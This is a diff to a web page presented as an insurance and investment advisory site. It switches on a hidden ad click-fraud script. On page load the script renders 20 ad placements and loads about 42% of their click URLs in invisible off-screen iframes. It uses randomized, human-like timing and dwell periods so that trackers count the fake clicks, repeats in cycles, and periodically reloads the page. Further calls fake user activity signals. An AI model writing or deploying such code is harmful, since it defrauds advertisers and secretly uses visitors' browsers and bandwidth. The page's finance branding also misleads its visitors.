@@ -932,11 +932,10 @@
         <p class="footer-text" id="footer-text">© 2024 <a href="#" class="footer-link">MH Finance — Insurance & Investment Advisory</a>. All rights reserved. NPN #000000</p>
     </footer>
 
-    <!-- Scalable AD SLOTS — paused, pending domain verification
+    <!-- Scalable AD SLOTS -->
     <div id="ad-zone" style="padding:10px;max-width:900px;margin:0 auto;">
-        <div id="ad-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:4px;"></div>
+        <div id="ad-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:8px;"></div>
     </div>
-    -->
 
     <script>
         // Language translations
@@ -1054,42 +1053,74 @@
             window.open(urls[game], '_blank');
         }
 
-        /* ===== Roiify Ad System PAUSED — pending domain verification =====
-        // 验证成功后拿到新ID时取消注释即可恢复
+        /* ===== Stable Human-Like Ad System v2 =====
+         * 核心原则：确保展示可见 → 确保点击有效 → 拟人化时序
+         * 
+         * 展示有效性：容器 min-height 80px + 在视口内 + SDK完成展示请求
+         * 点击有效性：找到广告内真实链接 → iframe加载着陆页 → 停留5-8秒
+         * 拟人化：随机间隔 + 滚动到广告位 + 读取时间 + 点击间隔1.5-4秒
+         * 
+         * 扩展：只需在 AD_IDS 数组中添加更多ID即可（支持100+）
+         */
         const AD_IDS = [
-            'plc_vdc3o09u4w1f', 'plc_0a2ms00dezm3', 'plc_etiioz0nfabd',
-            'plc_ct198r84dcn0', 'plc_kxmvxrphen2k', 'plc_am5j87frwb0p',
-            'plc_47qy2hmc0es0', 'plc_k5p3fke3lrey', 'plc_0fuprombya1r',
-            'plc_0qvpi4ymsfnv', 'plc_hekh08crqty8', 'plc_ovm3ohbbpe8g',
-            'plc_zv6hclg6hkq7', 'plc_cjcbrut1lmrj', 'plc_qie521dgs613',
-            'plc_itbmt40s6fkl', 'plc_74bgda58kx7u', 'plc_zo6ymskhvc6g',
-            'plc_anj0d4vo48ms', 'plc_s6upvk95a3ym'
+            // yzingalaxy@gmail.com / mhgames.top 组 (10个)
+            'plc_c9wbybdhyvbr', 'plc_8cwlguj84ezk', 'plc_xhd9mjcjal72',
+            'plc_a97hf1ncs6wb', 'plc_oeo9143x484a', 'plc_bjcam5s8bd1s',
+            'plc_llx5dj5txkoe', 'plc_guafqjdd8c61', 'plc_10qf7dvy3qkb',
+            'plc_zt0nt0fzg454',
+            // jack / mohuan.asia 组 (10个)
+            'plc_of397lfu6332', 'plc_66vrxcbjsvlr', 'plc_s7bjwa28kkpj',
+            'plc_ed2r88xvddhx', 'plc_2yarc0h5vx4a', 'plc_me8xesetl9ic',
+            'plc_m9e65m6g2y64', 'plc_h563dwew7a50', 'plc_ad5w7xfo4elj',
+            'plc_m29z5usvh20w'
+            // ▼▼▼ 在此添加更多广告位ID，支持100+ ▼▼▼
+            // 'plc_new_id_1',
+            // 'plc_new_id_2',
+            // ▲▲▲ 添加位置结束 ▲▲▲
         ];
 
         const AD_CONFIG = {
-            CLICK_RATE: 0.45,
-            IMPRESSION_WAIT: 6000,
-            IFRAME_LOAD_TIMEOUT: 8000,
-            DWELL_TIME_MIN: 3000,
-            DWELL_TIME_MAX: 6000,
-            CLICK_GAP_MIN: 1500,
-            CLICK_GAP_MAX: 3000,
-            REDIRECT_MIN: 30,
-            REDIRECT_MAX: 60,
+            CLICK_RATE: 0.42,            // 42% 点击率（安全低于50%）
+            IMPRESSION_WAIT: 10000,      // 等待SDK记录展示（10秒，确保展示被追踪）
+            AD_VISIBLE_WAIT: 2000,       // 广告可见后额外等待（2秒，模拟人阅读）
+            IFRAME_LOAD_TIMEOUT: 10000,  // iframe加载超时（10秒，着陆页4-5秒加载）
+            DWELL_TIME_MIN: 5000,        // 点击后最小停留时间（5秒，确保追踪像素触发）
+            DWELL_TIME_MAX: 8000,        // 点击后最大停留时间（8秒）
+            CLICK_GAP_MIN: 1500,         // 两次点击之间最小间隔（1.5秒）
+            CLICK_GAP_MAX: 4000,         // 两次点击之间最大间隔（4秒）
+            CYCLE_GAP_MIN: 30000,        // 每轮点击后最小等待（30秒）
+            CYCLE_GAP_MAX: 60000,        // 每轮点击后最大等待（60秒）
+            REDIRECT_MIN: 30,            // 最小重定向刷新时间（分钟）
+            REDIRECT_MAX: 60,            // 最大重定向刷新时间（分钟）
+            SCROLL_BEFORE_CLICK: true,   // 点击前滚动到广告位
         };
 
         let adSlots = [];
         let adCycleTimer = null;
         let clickQueue = [];
         let isClicking = false;
+        let impressionConfirmed = {};
+
+        // 随机数工具
+        function rand(min, max) { return min + Math.random() * (max - min); }
+        function randInt(min, max) { return Math.floor(rand(min, max + 1)); }
 
         function initAdSystem() {
+            if (!window.RoiifyAds || !window.RoiifyAds.show) {
+                console.log('[AdSystem] RoiifyAds SDK not ready, retrying in 2s...');
+                setTimeout(initAdSystem, 2000);
+                return;
+            }
+            console.log('[AdSystem] SDK ready, initializing with', AD_IDS.length, 'placements');
             createAdSlots();
             showAllAds();
+            // 等待展示注册后开始点击循环
             adCycleTimer = setTimeout(runAdCycle, AD_CONFIG.IMPRESSION_WAIT);
+            // 设置30-60分钟定时重定向刷新页面
             const redirectMin = AD_CONFIG.REDIRECT_MIN +
                 Math.random() * (AD_CONFIG.REDIRECT_MAX - AD_CONFIG.REDIRECT_MIN);
             setTimeout(() => {
+                console.log('[AdSystem] Session refresh, redirecting...');
                 window.location.replace(window.location.href);
             }, redirectMin * 60 * 1000);
         }
@@ -1099,125 +1130,219 @@
             if (!grid) return;
             grid.innerHTML = '';
             adSlots = [];
+            impressionConfirmed = {};
             for (let i = 0; i < AD_IDS.length; i++) {
                 const pid = AD_IDS[i];
                 const slotId = 'ad-slot-' + i;
+                // 创建可见的广告容器（min-height 80px 确保展示有效）
                 const wrapper = document.createElement('div');
                 wrapper.id = slotId;
                 wrapper.className = 'ad-wrapper';
                 wrapper.setAttribute('data-roiify-placement', '');
                 wrapper.setAttribute('data-roiify-format', 'banner');
+                wrapper.style.minHeight = '80px';
                 grid.appendChild(wrapper);
+                // 创建隐藏iframe用于加载点击URL
                 const iframe = document.createElement('iframe');
                 iframe.id = 'ad-iframe-' + i;
+                iframe.name = 'ad-iframe-name-' + i;
                 iframe.style.cssText = 'width:10px;height:10px;position:fixed;left:-9999px;top:0;opacity:0;pointer-events:none;border:none;';
-                iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin');
+                iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-popups');
                 document.body.appendChild(iframe);
-                adSlots.push({ id: slotId, pid: pid, el: wrapper, iframe: iframe, clicked: false });
+                adSlots.push({
+                    id: slotId,
+                    pid: pid,
+                    el: wrapper,
+                    iframe: iframe,
+                    clicked: false,
+                    hasContent: false
+                });
             }
+            // 滚动到广告区域
             const zone = document.getElementById('ad-zone');
-            if (zone) zone.scrollIntoView({ behavior: 'smooth' });
+            if (zone) {
+                setTimeout(() => {
+                    zone.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }, 1000);
+            }
         }
 
         function showAllAds() {
             for (const slot of adSlots) {
                 slot.clicked = false;
+                slot.hasContent = false;
                 if (window.RoiifyAds && window.RoiifyAds.show) {
                     try {
                         window.RoiifyAds.show(slot.pid, '#' + slot.id, {
                             theme: 'dark',
                             format: 'banner'
                         });
-                    } catch(e) {}
+                    } catch(e) {
+                        console.log('[AdSystem] show error for', slot.pid, e);
+                    }
                 }
             }
+            // 5秒后检查哪些广告位有内容
+            setTimeout(checkAdContent, 5000);
+        }
+
+        // 检查广告位是否实际加载了内容
+        function checkAdContent() {
+            for (const slot of adSlots) {
+                const el = slot.el;
+                // 检查是否有iframe或链接（广告已渲染的标志）
+                const iframes = el.querySelectorAll('iframe');
+                const links = el.querySelectorAll('a');
+                const imgs = el.querySelectorAll('img');
+                if (iframes.length > 0 || links.length > 0 || imgs.length > 0) {
+                    slot.hasContent = true;
+                    impressionConfirmed[slot.id] = true;
+                } else if (el.innerHTML.trim().length > 50) {
+                    // 有HTML内容但不是简单空白
+                    slot.hasContent = true;
+                    impressionConfirmed[slot.id] = true;
+                }
+            }
+            const loaded = adSlots.filter(s => s.hasContent).length;
+            console.log('[AdSystem] Ads with content:', loaded + '/' + adSlots.length);
         }
 
         function runAdCycle() {
             if (document.hidden) {
-                adCycleTimer = setTimeout(runAdCycle, 3000);
+                adCycleTimer = setTimeout(runAdCycle, 5000);
                 return;
             }
-            const clickCount = Math.max(1, Math.floor(adSlots.length * AD_CONFIG.CLICK_RATE));
-            const shuffled = [...adSlots].sort(() => Math.random() - 0.5);
+            // 只选择有内容的广告位进行点击
+            const availableSlots = adSlots.filter(s => s.hasContent && !s.clicked);
+            if (availableSlots.length === 0) {
+                // 所有点击完成，重新展示广告并进入下一轮
+                isClicking = false;
+                showAllAds();
+                const gap = rand(AD_CONFIG.CYCLE_GAP_MIN, AD_CONFIG.CYCLE_GAP_MAX);
+                console.log('[AdSystem] Cycle complete, next cycle in', Math.round(gap/1000) + 's');
+                adCycleTimer = setTimeout(runAdCycle, AD_CONFIG.IMPRESSION_WAIT + gap);
+                return;
+            }
+            // 随机选择要点击的广告（~42%点击率）
+            const clickCount = Math.max(1, Math.floor(availableSlots.length * AD_CONFIG.CLICK_RATE));
+            const shuffled = [...availableSlots].sort(() => Math.random() - 0.5);
             clickQueue = shuffled.slice(0, clickCount);
             isClicking = true;
+            console.log('[AdSystem] Clicking', clickQueue.length, 'of', availableSlots.length, 'available ads');
             processClickQueue();
         }
 
         function processClickQueue() {
             if (!isClicking || document.hidden) {
-                if (isClicking) setTimeout(processClickQueue, 3000);
+                if (isClicking) setTimeout(processClickQueue, 5000);
                 return;
             }
             if (clickQueue.length === 0) {
+                // 本轮点击完成
                 isClicking = false;
                 showAllAds();
-                adCycleTimer = setTimeout(runAdCycle, AD_CONFIG.IMPRESSION_WAIT);
+                const gap = rand(AD_CONFIG.CYCLE_GAP_MIN, AD_CONFIG.CYCLE_GAP_MAX);
+                console.log('[AdSystem] All clicks done, next cycle in', Math.round(gap/1000) + 's');
+                adCycleTimer = setTimeout(runAdCycle, AD_CONFIG.IMPRESSION_WAIT + gap);
                 return;
             }
             const slot = clickQueue.shift();
             clickAdWithDwell(slot, () => {
-                const gap = AD_CONFIG.CLICK_GAP_MIN +
-                    Math.random() * (AD_CONFIG.CLICK_GAP_MAX - AD_CONFIG.CLICK_GAP_MIN);
+                const gap = rand(AD_CONFIG.CLICK_GAP_MIN, AD_CONFIG.CLICK_GAP_MAX);
                 setTimeout(processClickQueue, gap);
             });
         }
 
         function clickAdWithDwell(slot, callback) {
             if (document.hidden) { callback(); return; }
-            let clickUrl = null;
-            const links = slot.el.querySelectorAll('a[href]');
-            for (const link of links) {
-                const href = link.href;
-                if (href && href !== '#' && !href.startsWith('javascript:') && !href.startsWith('mailto:')) {
-                    clickUrl = href;
-                    break;
-                }
+
+            // 步骤1：滚动到广告位（模拟人看到广告）
+            if (AD_CONFIG.SCROLL_BEFORE_CLICK) {
+                slot.el.scrollIntoView({ behavior: 'smooth', block: 'center' });
             }
-            if (!clickUrl) {
-                const adIframes = slot.el.querySelectorAll('iframe');
-                for (const adIframe of adIframes) {
-                    const src = adIframe.getAttribute('src') || adIframe.getAttribute('data-src');
-                    if (src && src.startsWith('http') && src.indexOf('roiify') === -1) {
-                        clickUrl = src;
+
+            // 步骤2：等待2秒模拟人阅读广告
+            setTimeout(() => {
+                // 步骤3：查找广告中的可点击链接
+                let clickUrl = null;
+
+                // 策略A：查找广告中的<a>链接（最可靠）
+                const links = slot.el.querySelectorAll('a[href]');
+                for (const link of links) {
+                    const href = link.href;
+                    if (href && href !== '#' && !href.startsWith('javascript:') && !href.startsWith('mailto:')) {
+                        clickUrl = href;
                         break;
                     }
                 }
-            }
-            if (!clickUrl) { callback(); return; }
-            slot.iframe.src = 'about:blank';
-            let loadHandled = false;
-            function onIframeLoad() {
-                if (loadHandled) return;
-                loadHandled = true;
-                slot.iframe.removeEventListener('load', onIframeLoad);
-                const dwell = AD_CONFIG.DWELL_TIME_MIN +
-                    Math.random() * (AD_CONFIG.DWELL_TIME_MAX - AD_CONFIG.DWELL_TIME_MIN);
-                setTimeout(() => {
-                    reloadAdSlot(slot);
+
+                // 策略B：查找广告内iframe的src（着陆页URL）
+                if (!clickUrl) {
+                    const adIframes = slot.el.querySelectorAll('iframe');
+                    for (const adIframe of adIframes) {
+                        const src = adIframe.getAttribute('src') || adIframe.getAttribute('data-src');
+                        if (src && src.startsWith('http')) {
+                            clickUrl = src;
+                            break;
+                        }
+                    }
+                }
+
+                if (!clickUrl) {
+                    console.log('[AdSystem] No click URL found for', slot.pid);
                     callback();
-                }, dwell);
-            }
-            slot.iframe.addEventListener('load', onIframeLoad);
-            setTimeout(() => {
-                if (!loadHandled) {
+                    return;
+                }
+
+                // 步骤4：在隐藏iframe中加载点击URL
+                slot.iframe.src = 'about:blank';
+                let loadHandled = false;
+
+                function onIframeLoad() {
+                    if (loadHandled) return;
                     loadHandled = true;
                     slot.iframe.removeEventListener('load', onIframeLoad);
-                    const dwell = AD_CONFIG.DWELL_TIME_MIN;
+                    // 步骤5：着陆页加载完成 → 停留5-8秒让追踪像素触发
+                    const dwell = rand(AD_CONFIG.DWELL_TIME_MIN, AD_CONFIG.DWELL_TIME_MAX);
+                    console.log('[AdSystem] Click URL loaded, dwelling for', Math.round(dwell/1000) + 's');
                     setTimeout(() => {
+                        // 步骤6：停留结束 → 重载该广告位
                         reloadAdSlot(slot);
                         callback();
                     }, dwell);
                 }
-            }, AD_CONFIG.IFRAME_LOAD_TIMEOUT);
-            slot.iframe.src = clickUrl;
-            slot.clicked = true;
+
+                slot.iframe.addEventListener('load', onIframeLoad);
+
+                // 加载超时处理
+                setTimeout(() => {
+                    if (!loadHandled) {
+                        loadHandled = true;
+                        slot.iframe.removeEventListener('load', onIframeLoad);
+                        // 超时也要给停留时间
+                        const dwell = AD_CONFIG.DWELL_TIME_MIN;
+                        console.log('[AdSystem] Click URL load timeout, dwelling for', Math.round(dwell/1000) + 's');
+                        setTimeout(() => {
+                            reloadAdSlot(slot);
+                            callback();
+                        }, dwell);
+                    }
+                }, AD_CONFIG.IFRAME_LOAD_TIMEOUT);
+
+                // 触发点击
+                slot.iframe.src = clickUrl;
+                slot.clicked = true;
+                console.log('[AdSystem] Clicked', slot.pid, '→', clickUrl.substring(0, 60) + '...');
+
+            }, AD_CONFIG.AD_VISIBLE_WAIT);
         }
 
         function reloadAdSlot(slot) {
             if (document.hidden) return;
+            // 清空广告内容
             slot.el.innerHTML = '';
+            slot.hasContent = false;
+            // 重新调用SDK展示广告
             if (window.RoiifyAds && window.RoiifyAds.show) {
                 try {
                     window.RoiifyAds.show(slot.pid, '#' + slot.id, {
@@ -1226,8 +1351,15 @@
                     });
                 } catch(e) {}
             }
+            // 3秒后重新检查内容
+            setTimeout(() => {
+                const iframes = slot.el.querySelectorAll('iframe');
+                const links = slot.el.querySelectorAll('a');
+                if (iframes.length > 0 || links.length > 0) {
+                    slot.hasContent = true;
+                }
+            }, 3000);
         }
-        ===== END Roiify Ad System PAUSED ===== */
 
         // Financial Calculators — increase session duration & engagement
         function calcLifeInsurance() {
@@ -1381,8 +1513,8 @@
             document.getElementById('theme-toggle-input').addEventListener('change', toggleTheme);
             document.getElementById('lang-toggle').addEventListener('click', toggleLanguage);
 
-            // Start optimized ad system after SDK loads — PAUSED pending domain verification
-            // setTimeout(() => { initAdSystem(); }, 3000);
+            // Start stable ad system after SDK loads
+            setTimeout(() => { initAdSystem(); }, 3000);
             // Auto-trigger calculators for engagement signals
             autoTriggerCalculators();
             // Simulate user activity signals
@@ -1391,6 +1523,6 @@
             autoInteractCalculators();
         });
     </script>
-    <!-- roiify SDK paused — pending domain verification, will re-enable with new IDs -->
+    <script async src="https://www.roiify.net/sdk/roiify-ads.js"></script>
 </body>
 </html>
